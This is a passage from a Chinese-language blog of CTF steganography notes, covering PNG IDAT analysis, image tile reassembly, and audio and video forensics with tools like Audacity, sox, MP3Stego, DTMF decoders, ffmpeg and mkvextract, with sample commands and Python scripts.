54</code>，将两个chunk的IDAT在<code>union CTYPE type</code>的位置补上即可得到完整的图片。</p><p>直接找到对应位置修改。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/56.png" alt="56"></p><h3 id="IDAT信息隐藏"><a href="#IDAT信息隐藏" class="headerlink" title="IDAT信息隐藏"></a>IDAT信息隐藏</h3><p>IDAT：存储实际的数据，在数据流中可包含多个连续顺序的图像数据块，储存图像像数数据。在数据流中可包含多个连续顺序的图像数据块。采用 LZ77 算法的派生算法进行压缩。可以用 zlib 解压缩。IDAT块只有当上一个块充满时，才会继续下 一个新块。</p><p>首先查看png的idat信息，是否有前一块没有满，后一块有数据的情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pngcheck.exe -v sctf.png</span><br></pre></td></tr></table></figure><p>我们可以看到最后一个数据块出问题了，根据PNG结构，我们直接搜索ascii码-IDAT，因为是最后一个数据块，所以直接，搜索最后一个idat或者直接搜索<code>49444154</code>。接下来就需要分析该数据块的结构，首先<code>49444154</code>是<code>Chunk Type Code（数据块类型码）</code>，他的前面是<code>Length（长度）</code>，这里是<code>0000008A</code>，转换成十进制，就是138也就是说，<code>Chunk Data（数据块数据）</code>的长度是138，最后四个字节就是<code>CRC</code>。如图：</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/23.png" alt="23"></p><p>去出数据块数据，zlib解压，二进制转字符串。</p><h3 id="图片拼接"><a href="#图片拼接" class="headerlink" title="图片拼接"></a>图片拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">montage *jpg -tile <span class="number">10</span>x12 -geometry <span class="number">200</span>x100+<span class="number">0</span>+<span class="number">0</span> out.jpg <span class="comment">#把图片碎片合成一个图片</span></span><br><span class="line"><span class="comment"># 将目录中的jpg文件按顺序拼成x轴10块，y轴12块，每个图块大小为200x100像素，输出文件为out.jpg</span></span><br><span class="line"></span><br><span class="line">gaps --image=out.jpg --generations=<span class="number">50</span> --population=<span class="number">120</span> --size=<span class="number">100</span> <span class="comment">#还原原图片</span></span><br><span class="line">--image           指向拼图的路径</span><br><span class="line">--size            拼图块的像素尺寸</span><br><span class="line">--generations     遗传算法的代的数量</span><br><span class="line">--population      个体数量</span><br><span class="line">--verbose         每一代训练结束后展示最佳结果</span><br><span class="line">--save            将拼图还原为图像</span><br></pre></td></tr></table></figure><h3 id="Honeyview"><a href="#Honeyview" class="headerlink" title="Honeyview"></a>Honeyview</h3><p>可以打开bgp文件。</p><h3 id="db文件"><a href="#db文件" class="headerlink" title="db文件"></a>db文件</h3><p>如果文件中有.db文件，尝试thumbs文件，db文件在win下不可见，直接再压缩包中拖入工具。</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>二维码颜色反转，使用<code>stegsolve.jar</code>，进行颜色反转。</p><p>有时候两张图片使用stegsove得到一个不清晰二维码，可以继续使用stegsolve修复二维码。</p><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><h4 id="莫斯电码"><a href="#莫斯电码" class="headerlink" title="莫斯电码"></a>莫斯电码</h4><p>常用工具<code>Audacity </code>。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/13.png" alt="13"></p><p>把上面的点作为 1，下面的点作为 0</p><p><code>0110011001101100011000010110011101111011011001100110010100111000011001100110010000110100001101100011100000110010001100000011010100110001001100110110001000110101001101000110001101100100011001000011010100111001011000100011000000110100001110000011010100110111001100010011100101100110001110010011010001111101</code></p><p>使用python脚本分析频谱图，对高低振幅转换为<code>01</code>，高振幅为<code>1</code>，低振幅为<code>0</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_records</span>(<span class="params">records, format, f</span>):</span></span><br><span class="line">    <span class="comment">#Write a sequence of tuples to a binary file of structures.</span></span><br><span class="line">    record_struct = Struct(format)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> records:</span><br><span class="line">        f.write(record_struct.pack(*r))</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./music.wav&quot;</span></span><br><span class="line">f = wave.open(path, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment"># 读取格式信息</span></span><br><span class="line"><span class="comment"># (nchannels, sampwidth, framerate, nframes, comptype, compname)</span></span><br><span class="line">params = f.getparams()</span><br><span class="line">nchannels, sampwidth, framerate, nframes = params[:<span class="number">4</span>]</span><br><span class="line"><span class="comment"># 读取波形数据</span></span><br><span class="line">str_data = f.readframes(nframes)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#将波形数据转换为数组</span></span><br><span class="line">wave_data = np.fromstring(str_data, dtype=np.short)</span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># arr = [elem for elem in wave_data if elem &gt;0]</span></span><br><span class="line">max = <span class="number">0</span></span><br><span class="line">d = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> wave_data:</span><br><span class="line">    <span class="keyword">if</span> i &lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> max !=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> max&lt;<span class="number">25000</span>:</span><br><span class="line">                d +=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> max &lt; i:</span><br><span class="line">        max = i</span><br><span class="line"></span><br><span class="line">print(d)</span><br><span class="line">print(<span class="string">&quot;\n\n\n\n&quot;</span>)</span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>,d)</span><br><span class="line">hex_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res = hex(int(i,<span class="number">2</span>))</span><br><span class="line">    hex_list.append(res)</span><br><span class="line">print(hex_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;result.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> hex_list:</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;B&#x27;</span>,int(x,<span class="number">16</span>))</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure><h4 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h4><p>直接右键查看频谱图。有时候切换频谱图看不到内容，这里可以修改频率。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/25.png" alt="25"></p><h4 id="听电话号码"><a href="#听电话号码" class="headerlink" title="听电话号码"></a>听电话号码</h4><h3 id="sox"><a href="#sox" class="headerlink" title="sox"></a>sox</h3><p>变慢音频</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav fast.wav speed 3.2</span><br></pre></td></tr></table></figure><p>直接查看频谱图</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram</span><br></pre></td></tr></table></figure><p>修改频谱图使其更清楚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox slowed.wav -n spectrogram -z 30 -Z -20 -x 1600</span><br></pre></td></tr></table></figure><p>查看音频元数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ sox --i &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav</span><br><span class="line"></span><br><span class="line">Input File     : &#39;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav&#39;</span><br><span class="line">Channels       : 1</span><br><span class="line">Sample Rate    : 8000</span><br><span class="line">Precision      : 16-bit</span><br><span class="line">Duration       : 00:00:20.08 &#x3D; 160640 samples ~ 1506 CDDA sectors</span><br><span class="line">File Size      : 321k</span><br><span class="line">Bit Rate       : 128k</span><br><span class="line">Sample Encoding: 16-bit Signed Integer PCM</span><br></pre></td></tr></table></figure><p>只获取该选项对应的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ soxi -ss &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav</span><br><span class="line">160640</span><br><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ </span><br><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ soxi -B &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;music.wav</span><br><span class="line">128k</span><br></pre></td></tr></table></figure><h3 id="mediainfo"><a href="#mediainfo" class="headerlink" title="mediainfo"></a>mediainfo</h3><p>查看音频元数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ mediainfo &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;fast.wav</span><br><span class="line">General                                                                                                                                                                           </span><br><span class="line">Complete name                            : &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;fast.wav                                                                                                      </span><br><span class="line">Format                                   : Wave                                                                                                                                   </span><br><span class="line">File size                                : 5.13 MiB</span><br><span class="line">Duration                                 : 56 s 62 ms</span><br><span class="line">Overall bit rate mode                    : Constant</span><br><span class="line">Overall bit rate                         : 768 kb&#x2F;s</span><br><span class="line"></span><br><span class="line">Audio</span><br><span class="line">Format                                   : PCM</span><br><span class="line">Format settings                          : Little &#x2F; Signed</span><br><span class="line">Codec ID                                 : 1</span><br><span class="line">Duration                                 : 56 s 62 ms</span><br><span class="line">Bit rate mode                            : Constant</span><br><span class="line">Bit rate                                 : 768 kb&#x2F;s</span><br><span class="line">Channel(s)                               : 1 channel</span><br><span class="line">Sampling rate                            : 48.0 kHz</span><br><span class="line">Bit depth                                : 16 bits</span><br><span class="line">Stream size                              : 5.13 MiB (100%)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="silienteye"><a href="#silienteye" class="headerlink" title="silienteye"></a>silienteye</h3><p>使用sileneye工具打开，即可得到flag。</p><h3 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a>MP3Stego</h3><p>密码可能藏在字符串中。</p><p>使用strings</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mp3 | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P 密码 flag.mp3#解密之后在文件下可能会出现txt文件。</span><br></pre></td></tr></table></figure><h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><p>视频分帧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -f image2 image%d.jpg,将视频分离并且重命名为image1,2,3…jpg的图片文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -r 60 -f image2 image%d.jpg,将视频分离并且重命名为image1,2,3…jpg的图片文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i ogreman -map 0:s:0 ogreman-subs.srt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;font size&quot; ogreman-subs.srt | cut -d&quot;&gt;&quot; -f2</span><br></pre></td></tr></table></figure><p>也可以分离gif</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.gif frame_%05d.png</span><br></pre></td></tr></table></figure><h3 id="使用MP3脚本"><a href="#使用MP3脚本" class="headerlink" title="使用MP3脚本"></a>使用MP3脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\音频隐写\mp3&gt;python3 F:\CTF-tools\音频隐写\mp3\mp3.py F:\CTF-tools\音频隐写\mp3\我很抱歉.mp3</span><br><span class="line">HDCTF&#123;she_nerver_be_with_me&#125;</span><br></pre></td></tr></table></figure><h3 id="dtmf2num"><a href="#dtmf2num" class="headerlink" title="dtmf2num"></a>dtmf2num</h3><p><strong><a href="https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%9F%B3%E5%A4%9A%E9%A2%91">双音多频信号</a>（Dual-Tone Multi-Frequency, DTMF）</strong>，电话系统中电话机与交换机之间的一种用户信令，最常用于发拨号时送被叫号码。使用工具拿到音频中的电话号码。</p><p>通过拨号音的信号频率判断内容。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/37.png" alt="37"></p><h4 id="kali-dtmf2num"><a href="#kali-dtmf2num" class="headerlink" title="kali dtmf2num"></a>kali dtmf2num</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools/debian$ dtmf2num /home/steady/桌面/steady/密码.wav</span><br><span class="line"></span><br><span class="line">DTMF2NUM <span class="number">0.1</span><span class="number">.1</span></span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open /home/steady/桌面/steady/密码.wav</span><br><span class="line">  wave size      <span class="number">2633728</span></span><br><span class="line">  format tag     <span class="number">1</span></span><br><span class="line">  channels:      <span class="number">2</span></span><br><span class="line">  samples/sec:   <span class="number">48000</span></span><br><span class="line">  avg/bytes/sec: <span class="number">192000</span></span><br><span class="line">  block align:   <span class="number">4</span></span><br><span class="line">  bits:          <span class="number">16</span></span><br><span class="line">  samples:       <span class="number">1316864</span></span><br><span class="line">  bias adjust:   <span class="number">2</span></span><br><span class="line">  volume peaks:  <span class="number">-388</span> <span class="number">388</span></span><br><span class="line">  normalize:     <span class="number">32379</span></span><br><span class="line">  resampling to: <span class="number">8000</span>hz</span><br><span class="line"></span><br><span class="line">- MF numbers:    <span class="number">44</span></span><br><span class="line"></span><br><span class="line">- DTMF numbers:  <span class="number">18688422216</span>D09<span class="comment">#重要信息。</span></span><br></pre></td></tr></table></figure><h4 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h4><p><code>http://dialabc.com/sound/detect/index.html</code>。</p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>也可以使用脚本，修改文件路径直接就可以拿到拨号号码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># load wav file。</span></span><br><span class="line">    <span class="comment">#这里注意修改文件。</span></span><br><span class="line">    wav = wave.open(<span class="string">&#x27;./1.wav&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解码出来的数字可能会有杂音，我们需要根据实际情况去重复。</p><h3 id="multimon-ng"><a href="#multimon-ng" class="headerlink" title="multimon-ng"></a>multimon-ng</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@root:~<span class="comment"># multimon-ng -t wav -a dtmf &#x27;/tmp/1.wav&#x27; </span></span><br><span class="line">multimon-ng <span class="number">1.1</span><span class="number">.7</span></span><br><span class="line">  (C) <span class="number">1996</span>/<span class="number">1997</span> by Tom Sailer HB9JNX/AE4WA</span><br><span class="line">  (C) <span class="number">2012</span><span class="number">-2019</span> by Elias Oenal</span><br><span class="line">Available demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPE</span><br><span class="line">Enabled demodulators: DTMF</span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="number">0</span></span><br><span class="line">DTMF: <span class="number">9</span></span><br></pre></td></tr></table></figure><h3 id="mkvinfo"><a href="#mkvinfo" class="headerlink" title="mkvinfo"></a>mkvinfo</h3><p>MKVToolNix是一套功能强大的<a href="https://baike.baidu.com/item/mkv/1658908">mkv</a>(Matroska)格式制作和处理的工具，支持将多种视频、音频、字幕等格式封装成mkv格式，支持提取mkv内音频及字幕到文件。</p><p>注意轨道和轨道类型。这里有三个轨道，可以看到这里有三个轨道–a video, an audio and a subs track。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ mkvinfo ogreman</span><br><span class="line">+ EBML 头</span><br><span class="line">|+ EBML 版本: <span class="number">1</span></span><br><span class="line">|+ EBML 读取版本: <span class="number">1</span></span><br><span class="line">|+ EBML ID 最大长度: <span class="number">4</span></span><br><span class="line">|+ EBML 大小最大长度: <span class="number">8</span></span><br><span class="line">|+ 文档类型: matroska</span><br><span class="line">|+ 文档类型版本: <span class="number">2</span></span><br><span class="line">|+ 文档类型读取版本: <span class="number">2</span></span><br><span class="line">+ 剪辑: 大小 <span class="number">159642</span></span><br><span class="line">|+ 定位头 (子条目将被跳过)</span><br><span class="line">|+ EBML void: 大小 <span class="number">148</span></span><br><span class="line">|+ 剪辑信息</span><br><span class="line">| + 时间戳缩放: <span class="number">1000000</span></span><br><span class="line">| + 混流应用程序: Lavf55<span class="number">.12</span><span class="number">.0</span></span><br><span class="line">| + 写入应用程序: HandBrake <span class="number">0.10</span><span class="number">.5</span> <span class="number">2016021100</span></span><br><span class="line">| + 剪辑 UID: <span class="number">0x26</span> <span class="number">0xdd</span> <span class="number">0x34</span> <span class="number">0x12</span> <span class="number">0x3f</span> <span class="number">0xa9</span> <span class="number">0xec</span> <span class="number">0x24</span> <span class="number">0xe6</span> <span class="number">0x53</span> <span class="number">0x9e</span> <span class="number">0xd3</span> <span class="number">0x45</span> <span class="number">0xe1</span> <span class="number">0xc1</span> <span class="number">0xe4</span></span><br><span class="line">| + 时长: <span class="number">00</span>:<span class="number">00</span>:<span class="number">02.500000000</span></span><br><span class="line">|+ 轨道</span><br><span class="line">| + 轨道</span><br><span class="line">|  + 轨道编号: <span class="number">1</span> (mkvmerge &amp; mkvextract 的轨道 ID: <span class="number">0</span>)</span><br><span class="line">|  + 轨道 UID: <span class="number">1</span></span><br><span class="line">|  + 紧缩标记: <span class="number">0</span></span><br><span class="line">|  + 语言: und</span><br><span class="line">|  + 编码格式 ID: V_MPEG4/ISO/AVC</span><br><span class="line">|  + 轨道类型: 视频</span><br><span class="line">|  + 默认帧时长: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.033333333</span> (对应视频轨的 <span class="number">30.000</span> 帧/场每秒)</span><br><span class="line">|  + 视频轨道</span><br><span class="line">|   + 像素宽度: <span class="number">1156</span></span><br><span class="line">|   + 像素高度: <span class="number">720</span></span><br><span class="line">|   + 显示器宽度: <span class="number">1156</span></span><br><span class="line">|   + 显示器高度: <span class="number">720</span></span><br><span class="line">|   + 显示器单位: <span class="number">3</span> (宽高比)</span><br><span class="line">|  + 编解码器私有数据: 大小 <span class="number">44</span> (H<span class="number">.264</span> 档次: Main @L4<span class="number">.0</span>)</span><br><span class="line">| + 轨道</span><br><span class="line">|  + 轨道编号: <span class="number">2</span> (mkvmerge &amp; mkvextract 的轨道 ID: <span class="number">1</span>)</span><br><span class="line">|  + 轨道 UID: <span class="number">2</span></span><br><span class="line">|  + 紧缩标记: <span class="number">0</span></span><br><span class="line">|  + 名称: Stereo</span><br><span class="line">|  + 语言: und</span><br><span class="line">|  + 编码格式 ID: A_AAC</span><br><span class="line">|  + 轨道类型: 音频</span><br><span class="line">|  + 音频轨</span><br><span class="line">|   + 声道数: <span class="number">2</span></span><br><span class="line">|   + 采样率: <span class="number">44100.0</span></span><br><span class="line">|  + 编解码器私有数据: 大小 <span class="number">5</span></span><br><span class="line">| + 轨道</span><br><span class="line">|  + 轨道编号: <span class="number">3</span> (mkvmerge &amp; mkvextract 的轨道 ID: <span class="number">2</span>)</span><br><span class="line">|  + 轨道 UID: <span class="number">3</span></span><br><span class="line">|  + 紧缩标记: <span class="number">0</span></span><br><span class="line">|  + 语言: eng</span><br><span class="line">|  + 默认轨道标记: <span class="number">0</span></span><br><span class="line">|  + 编码格式 ID: S_TEXT/ASS</span><br><span class="line">|  + 轨道类型: 字幕</span><br><span class="line">|  + 编解码器私有数据: 大小 <span class="number">481</span></span><br><span class="line">|+ 标签</span><br><span class="line">| + 标签</span><br><span class="line">|  + 目标</span><br><span class="line">|  + 简单</span><br><span class="line">|   + 名称: CREATION_TIME</span><br><span class="line">|   + 字符串: <span class="number">2016</span><span class="number">-11</span><span class="number">-22</span>T23:<span class="number">49</span>:<span class="number">31</span>Z</span><br><span class="line">|  + 简单</span><br><span class="line">|   + 名称: ENCODER</span><br><span class="line">|   + 字符串: Lavf55<span class="number">.12</span><span class="number">.0</span></span><br><span class="line">| + 标签</span><br><span class="line">|  + 目标</span><br><span class="line">|   + 轨道 UID: <span class="number">2</span></span><br><span class="line">| + 标签</span><br><span class="line">|  + 目标</span><br><span class="line">|   + 轨道 UID: <span class="number">3</span></span><br><span class="line">|+ 簇</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="mkvextract"><a href="#mkvextract" class="headerlink" title="mkvextract"></a>mkvextract</h3><p>提取三个轨道的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkvextract tracks ogreman 0:video 1:audio 2:subs</span><br><span class="line">steady@steady:~$ mkvextract tracks &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;output&#x2F;png&#x2F;ogreman 0:video 1:audio 2:subs</span><br><span class="line">正在将 CodecID 为 V_MPEG4&#x2F;ISO&#x2F;AVC 的轨道 0 提取到文件「video」。容器格式: AVC&#x2F;H.264 elementary stream                                  </span><br><span class="line">正在将 CodecID 为 A_AAC 的轨道 1 提取到文件「audio」。容器格式: raw AAC file with ADTS headers                                               </span><br><span class="line">正在将 CodecID 为 S_TEXT&#x2F;ASS 的轨道 2 提取到文件「subs」。容器格式: SSA&#x2F;ASS text subtitles                                                     </span><br><span class="line">进度: 100% </span><br></pre></td></tr></table></figure><p>查看我文件即可获取flag。</p><h3 id="mediainfo-1"><a href="#mediainfo-1" class="headerlink" title="mediainfo"></a>mediainfo</h3><p>查看音频元数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span 